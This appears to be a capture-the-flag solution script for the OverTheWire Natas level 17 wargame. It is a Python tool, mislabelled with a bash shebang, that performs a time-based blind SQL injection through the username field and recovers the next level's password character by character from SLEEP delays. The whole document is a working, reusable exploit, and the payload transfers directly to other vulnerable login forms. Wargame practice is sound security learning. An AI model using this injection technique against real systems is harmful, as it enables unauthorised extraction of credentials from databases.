#!/usr/bin/env bash

import requests as r
import string
import sys

def extract_password(url, chars, auth, proxies):

    password = ""
    for i in range(0, 33):
        try:
            for char in chars:
                payload = {"username": f"natas18\" AND IF(password like binary \""+ password + f"{char}%\", SLEEP(5), 1)#"}
                response_time = r.post(url, data=payload, auth=auth, proxies=proxies).elapsed.total_seconds()
                fist_decimal = round(response_time, 1)
                
                if response_time > 4:
                    password += char
                    print('\r' + "The password for the next level is: " + password, end='')
                    sys.stdout.flush()
                    break
        except KeyboardInterrupt:
            sys.exit(1)
    print("\n")

if __name__ == "__main__":

    # set of chars to discover the password
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    # target

    url = "http://natas17.natas.labs.overthewire.org/"

    # credentilas for basic auth
    user = "natas17"
    password = "" # insert password from the previous level

    proxies = {"https": "127.0.0.1:8080", "http": "127.0.0.1:8080"}

    auth = (user, password)

    extract_password(url, chars, auth, proxies)
